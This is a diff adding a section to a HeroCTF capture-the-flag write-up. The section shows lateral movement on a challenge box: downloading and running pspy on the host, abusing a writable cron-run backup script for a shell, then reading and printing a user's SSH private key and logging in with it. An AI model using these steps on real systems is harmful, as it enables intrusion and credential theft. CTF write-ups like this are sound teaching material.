@@ -864,6 +864,147 @@ We get the flag!
 
 Flag : **Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}**
 
+## Unintended Way : Get a shell as Dave
+
+Note :
+
+```
+I tried a lot of things to get a shell back as Dave. Nothing worked.
+
+Before stopping my research, i've contacted Log_s to ask hime, if there is any way to get a shell as Dave. And the answer is YES!
+
+As you can see bellow in french, he told me that he made a misstake while patching another box. Dave keep executing the backup script, and the backup user is allowed to write in it. So simply put a payload in it should give us a shell as Dave.
+```
+
+![0-discord](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0a004874-ee37-40e4-878f-a35aeeed31cd)
+
+### Solution
+
+Now let's see how to achieve this.  Come back ton a "backup" user terminal (after using the LFI/RCE to get a www-data shell and escalate to backup using rsync).
+
+First we will use `Pspy` utility to inspect when and how the backup file is executed.
+
+To do it we download `pspy` directly on the machine as we have internet access.
+
+```bash
+backup@backup:/var/www/html$ cd /tmp
+backup@backup:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+```
+
+Give it execution right and execute it.
+
+```bash
+backup@backup:/tmp$ chmod +x pspy64
+backup@backup:/tmp$ ./pspy64
+```
+
+Now keep looking at the output and wait a bit.
+
+![1-cron](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e85cc384-4cc0-46aa-9ab6-f3bc065ea376)
+
+Perfect, we can see that the user with id "1000" run the command `/bin/sh /bin/backup.sh`. So this should be Dave executing the backup utility.
+
+Next, let's look at the utility permissions.
+
+```bash
+backup@backup:/backup$ ls -la backup.sh
+ls -la backup.sh
+-rwxr-xr-x 1 backup backup 760 May 12 10:17 backup.sh
+```
+
+As Log_s say, we are allowed to write in it!
+
+Now let's look our ip address through `/etc/hosts` and then use `vim`, to write a php payload in it.
+
+```
+backup@backup:/backup$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.30.0.2      backup
+```
+
+Open a listener and keep waiting. You can get another instance open to look at pspy and instantly look the process.
+
+![2-shell_dave](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/64e43730-1fbc-4931-b12d-ca89cb04e176)
+
+We get a shell as Dave!
+
+Enumerating his home directory and we find ssh keys.
+
+```bash
+dave@backup:~/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Save it to your kali desktop as "id_rsa", and give it the appropriate permission with `chmod 600` then you can log in as Dave in ssh.
+
+```bash
+$ ls
+id_rsa
+
+$ chmod 600 id_rsa
+
+$ ssh -i id_rsa dave@dyn-01.heroctf.fr -p 11332
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.10.0-21-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+dave@dev:~$
+```
+
+![3-Exploit_proof](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2c3210a4-df1f-40ed-ab04-aaa2db29b923)
+
+**Thanks for reading!**
+
 ## Credits<a name="credits"></a>
 
 Special thanks to :
